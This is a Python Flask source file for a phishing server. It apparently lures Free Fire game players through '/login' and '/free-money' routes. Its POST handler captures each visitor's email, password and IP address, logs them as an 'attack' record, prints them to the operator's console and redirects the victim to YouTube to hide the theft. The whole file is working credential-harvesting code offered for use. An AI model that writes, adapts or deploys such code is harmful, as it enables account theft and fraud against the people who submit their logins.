from flask import Flask, render_template, request, redirect
from datetime import datetime
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from controls import *
import subprocess


# Importar logging aqui dentro da função para garantir que só seja importado quando necessário
import logging


app = Flask(__name__)

# Desativar os logs de werkzeug
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.before_request
def log_request_info():
    pass

@app.route('/', methods=["GET"])
def home():
    return render_template("index.html")



@app.route('/login', methods=["GET"])
def login():
    return render_template("login.html")
@app.route('/free-money', methods=["GET"])
def money():
    return render_template("index.html")
    

@app.route('/post', methods=["POST"])
def receber():
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr
    dados = {
        "tipo": "freefire",
        "ip": user_ip,
        "latitude": "-----------------",
        "longitude": "----------------",
        "username": request.form.get("email"),
        "password": request.form.get("senha"),
        "datetime": datetime.now()
    }
    print("---------------------------------------------Alguem Fez um Post------------------------------------------------")
    AddAtack(dados)

    GREEN = "\033[32m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    print(
        f"""
    {GREEN}Tipo:{RESET} {WHITE}{dados['tipo']}{RESET}
    {GREEN}IP:{RESET} {WHITE}{dados['ip']}{RESET}
    {GREEN}Latitude:{RESET} {WHITE}{dados['latitude']}{RESET}
    {GREEN}Longitude:{RESET} {WHITE}{dados['longitude']}{RESET}
    {GREEN}Usuario:{RESET} {WHITE}{dados['username']}{RESET}
    {GREEN}Senha:{RESET} {WHITE}{dados['password']}{RESET}
    {GREEN}Data:{RESET} {WHITE}{dados['datetime']}{RESET}
        """
    )
    
    return redirect("https://youtube.com")

        

if __name__=="__main__":
    try:
        # Códigos de escape ANSI para cores
        GREEN = "\033[32m"
        YELLOW = "\033[33m"
        RESET = "\033[0m"

        # Impressão das rotas com cores diferentes
        print(f"{GREEN}Rotas para este servidor:{RESET} \n{YELLOW}/login \n/\n/free-money\n/{RESET}")

        app.run(debug=True)
    except KeyboardInterrupt:
        print('\nFlask foi encerrado manualmente pelo usuário.')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1

    except Exception as e:
        print(f'\nOcorreu um erro inesperado: {str(e)}')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1

    